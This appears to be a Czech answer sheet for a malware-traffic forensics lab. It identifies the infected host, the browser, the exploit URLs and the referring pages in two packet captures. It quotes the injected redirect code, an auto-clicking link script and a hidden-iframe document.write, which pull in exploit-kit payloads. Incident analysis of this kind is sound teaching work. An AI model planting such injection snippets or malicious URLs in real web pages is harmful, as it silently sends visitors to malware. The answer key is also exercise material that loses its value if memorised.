# Zadání první části – soubor uloha1.pcap

### 1. Jaká je IP adresa stanice, která byla infikována?

```
127.80.179.181
```

### 2. Jaký prohlížeč infikovaná stanice používala?

Internet Explorer 8.0

```
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729)
```

### 3. Jaká je URL, ze které byl exploit stažen?

```
http://static.this-is-not-a-botnet.com/3h251q2c35
```

### 4. Jaká je URL webové stránky, ze které se stanice dostala na URL s exploitem?

```
http://akronkappas.com//d2a42e1f7d9a1021bd7d93af414c95c4.php?q=70a9b40eb73da11445c3a3609c8241d9
```

### 5. Jakým způsobem došlo k přesměrování na externí URL se škodlivým kódem?

```
<a id='myLink' href='http://static.this-is-not-a-botnet.com/3h251q2c35'>click</a><script>document.getElementById('myLink').click();</script>
```

# Zadání druhé části – soubor uloha2.pcap [?](https://itexamanswers.net/27-2-15-lab-investigating-a-malware-exploit-answers.html)

### 1. Která URL adresa (uveďte alespoň doménu) způsobila infekci stanice?

```
http://www.homeimprovement.com/remodeling-your-kitchen-cabinets.html
```

### 2. Jak se uživatel dostal na danou doménu?

```
http://www.bing.com/search?q=home+improvement+remodeling+your+kitchen&qs=n&sp=-1&pq=home+improvement+remodeling+your+kitchen&sc=0-40&sk=&cvid=194EC908DA65455B9E9A98285A33132B&first=7&FORM=PERE
```

### 3. Samotný malware je uložen na jiné (externí) URL adrese. Jaká je to adresa?

```
http://p27dokhpz2n7nvgr.1jw2lx.top/EE7E-AD39-7D8C-080C-18BF?iframe&_=1485557725652
```

### 4. Jakým způsobem došlo k přesměrování na externí URL se škodlivým kódem?

Script `http://retrotip.visionurbana.com.ve/dle_js.js` na adrese `http://www.homeimprovement.com/remodeling-your-kitchen-cabinets.html`

```
document.write('<div class="" style="position:absolute; width:383px; height:368px; left:17px; top:-858px;">  <div  style="" class=""><a>head</a><a class="head-menu-2"> </a><iframe src="http://tyu.benme.com/?q=zn_QMvXcJwDQDofGMvrESLtEMUbQA0KK2OH_76iyEoH9JHT1vrTUSkrttgWC&biw=Amaya.81lp85.406f4y5l9&oq=elTX_fUlL7ABPAuy2EyALQZnlY0IU1IQ8fj630PWwUWZ0pDRqx29UToBvdeW&yus=Amaya.110oz60.406a7e5q8&br_fl=4109&tuif=5364&ct=Amaya" width=290 height=257 ></ifr' +'ame> <a style=""></a></div><a class="" style="">temp</a></div>');
```
